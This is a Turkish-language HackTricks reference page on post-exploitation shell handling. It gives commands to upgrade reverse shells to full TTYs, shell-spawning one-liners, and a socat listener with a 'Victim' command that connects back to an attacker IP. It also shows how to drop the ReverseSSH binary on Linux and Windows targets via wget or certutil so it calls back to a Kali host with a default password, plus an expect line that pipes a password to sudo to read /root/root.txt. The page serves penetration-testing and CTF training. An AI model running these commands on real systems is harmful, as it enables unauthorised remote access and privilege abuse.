# Full TTYs

{{#include ../../banners/hacktricks-training.md}}

## Full TTY

`SHELL` değişkeninde ayarladığınız shell'in **mutlaka** _**/etc/shells**_ içinde **listelenmiş** olması gerektiğini unutmayın veya `SHELL değişkeninin değeri /etc/shells dosyasında bulunamadı. Bu olay rapor edildi` mesajını alırsınız. Ayrıca, sonraki snippet'lerin yalnızca bash'te çalıştığını unutmayın. Eğer zsh'deyseniz, shell'i elde etmeden önce `bash` komutunu çalıştırarak bash'e geçin.

#### Python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
> [!NOTE]
> **`stty -a`** komutunu çalıştırarak **satır** ve **sütun** **sayısını** alabilirsiniz.

#### script
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Shell'leri Başlatma**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`

## ReverseSSH

**Etkileşimli shell erişimi**, ayrıca **dosya transferleri** ve **port yönlendirmeleri** için uygun bir yol, statik bağlı ssh sunucusu [ReverseSSH](https://github.com/Fahrj/reverse-ssh)'yi hedefe bırakmaktır.

Aşağıda `x86` için upx ile sıkıştırılmış ikili dosyalarla bir örnek bulunmaktadır. Diğer ikili dosyalar için [sürümler sayfası](https://github.com/Fahrj/reverse-ssh/releases/latest/) kontrol edin.

1. ssh port yönlendirme isteğini yakalamak için yerel olarak hazırlanın:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Linux hedef:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows 10 hedefi (daha eski sürümler için, [proje readme](https://github.com/Fahrj/reverse-ssh#features) kontrol edin):
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
- Eğer ReverseSSH port yönlendirme isteği başarılı olduysa, artık `reverse-ssh(.exe)`'yi çalıştıran kullanıcının bağlamında varsayılan şifre `letmeinbrudipls` ile giriş yapabilmelisiniz:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) otomatik olarak Linux ters kabuklarını TTY'ye yükseltir, terminal boyutunu yönetir, her şeyi kaydeder ve daha fazlasını yapar. Ayrıca Windows kabukları için readline desteği sağlar.

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## No TTY

Eğer bir sebepten dolayı tam bir TTY elde edemiyorsanız, **hala kullanıcı girişi bekleyen programlarla etkileşimde bulunabilirsiniz**. Aşağıdaki örnekte, şifre `sudo`'ya bir dosyayı okumak için iletilir:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
{{#include ../../banners/hacktricks-training.md}}
